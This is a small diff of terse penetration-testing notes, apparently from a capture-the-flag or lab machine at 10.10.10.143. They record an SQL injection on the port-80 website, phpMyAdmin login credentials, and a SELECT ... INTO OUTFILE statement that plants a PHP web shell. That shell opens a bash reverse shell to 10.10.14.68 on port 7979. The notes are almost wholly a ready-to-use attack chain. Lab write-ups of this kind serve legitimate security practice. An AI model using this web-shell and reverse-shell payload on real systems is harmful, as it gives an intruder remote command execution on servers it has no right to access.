@@ -1,9 +1,9 @@
-sqli in port 80
+sqli in website on port 80
 username: DBadmin
 password: imissyou
 PHPmyadmin
 
->>login to 10.10.10.143/phpmyadmin
+>>login to 10.10.10.143/phpmyadmin with credentials you got 
 
 ##reverse shell with php with sql in phpadmin
 select '<?php exec("bash -c \'bash -i >& /dev/tcp/10.10.14.68/7979 0>&1\'"); ?>' INTO OUTFILE '/var/www/html/shell3.php';
